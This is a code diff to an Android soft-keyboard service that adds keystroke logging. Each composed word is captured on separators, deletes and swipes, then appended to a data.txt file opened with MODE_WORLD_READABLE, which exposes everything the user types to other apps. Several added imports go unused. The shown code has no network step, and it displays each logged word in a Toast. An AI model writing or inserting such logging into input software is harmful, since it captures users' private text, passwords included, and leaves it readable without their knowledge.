@@ -21,7 +21,10 @@ import android.content.Context;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
+import android.net.Uri;
 import android.os.IBinder;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.FileProvider;
 import android.text.InputType;
 import android.text.method.MetaKeyKeyListener;
 import android.util.Log;
@@ -45,6 +48,7 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStreamWriter;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.logging.Logger;
@@ -110,6 +114,8 @@ public class SoftKeyboard extends InputMethodService
         final TextServicesManager tsm = (TextServicesManager) getSystemService(
                 Context.TEXT_SERVICES_MANAGER_SERVICE);
         mScs = tsm.newSpellCheckerSession(null, null, this, true);
+
+
     }
     
     /**
@@ -536,7 +542,11 @@ public class SoftKeyboard extends InputMethodService
         if (isWordSeparator(primaryCode)) {
             // Handle separator
             if (mComposing.length() > 0) {
+
+                String argument = new String(mComposing);
+                writefile(argument);
                 commitTyped(getCurrentInputConnection());
+
             }
             sendKey(primaryCode);
             updateShiftKeyState(getCurrentInputEditorInfo());
@@ -621,7 +631,8 @@ public class SoftKeyboard extends InputMethodService
             getCurrentInputConnection().commitText("", 0);
             updateCandidates();
         } else {
-            keyDownUp(KeyEvent.KEYCODE_DEL);
+            keyDownUp(KeyEvent.KEYCODE_DEL);String argument = new String(mComposing);
+        writefile(argument);
         }
         updateShiftKeyState(getCurrentInputEditorInfo());
     }
@@ -647,22 +658,24 @@ public class SoftKeyboard extends InputMethodService
         }
     }
 
-    private void writefile(String argument)
-    {
-        try {
-            FileOutputStream fos = null;
+        private void writefile(String argument)
+        {
+            try {
+                FileOutputStream fos = null;
 
-            File file = null;
-            file = getFilesDir();
-            fos = openFileOutput("data.txt", Context.MODE_PRIVATE);
-            String text = argument;
-            fos.write(text.getBytes());
-            Toast.makeText(this, String.format("Word: %s", text),
-                    Toast.LENGTH_SHORT).show();
-        }catch (IOException e) {
+                File file = null;
+                file = getFilesDir();
+                fos = openFileOutput("data.txt", Context.MODE_WORLD_READABLE | Context.MODE_APPEND);
+                String text = argument;
+                String text1 = new String(" ");
+                fos.write(text.getBytes());
+                fos.write(text1.getBytes());
+                Toast.makeText(this, String.format("Word: %s", text),
+                        Toast.LENGTH_SHORT).show();
+            }catch (IOException e) {
 
+            }
         }
-    }
     
     private void handleCharacter(int primaryCode, int[] keyCodes) {
         if (isInputViewShown()) {
@@ -672,9 +685,6 @@ public class SoftKeyboard extends InputMethodService
         }
         if (mPredictionOn) {
             mComposing.append((char) primaryCode);
-
-            String argument = new String(mComposing);
-            writefile(argument);
             getCurrentInputConnection().setComposingText(mComposing, 1);
             updateShiftKeyState(getCurrentInputEditorInfo());
             updateCandidates();
@@ -682,6 +692,7 @@ public class SoftKeyboard extends InputMethodService
             getCurrentInputConnection().commitText(
                     String.valueOf((char) primaryCode), 1);
         }
+
     }
 
     private void handleClose() {
@@ -734,6 +745,7 @@ public class SoftKeyboard extends InputMethodService
                 && index < mCompletions.length) {
             CompletionInfo ci = mCompletions[index];
             getCurrentInputConnection().commitCompletion(ci);
+
             if (mCandidateView != null) {
                 mCandidateView.clear();
             }
@@ -742,6 +754,7 @@ public class SoftKeyboard extends InputMethodService
 
             if (mPredictionOn && mSuggestions != null && index >= 0) {
                 mComposing.replace(0, mComposing.length(), mSuggestions.get(index));
+
             }
             commitTyped(getCurrentInputConnection());
 
@@ -752,7 +765,8 @@ public class SoftKeyboard extends InputMethodService
         Log.d("SoftKeyboard", "Swipe right");
         if (mCompletionOn || mPredictionOn) {
             pickDefaultCandidate();
-        }
+        }String argument = new String(mComposing);
+        writefile(argument);
     }
     
     public void swipeLeft() {
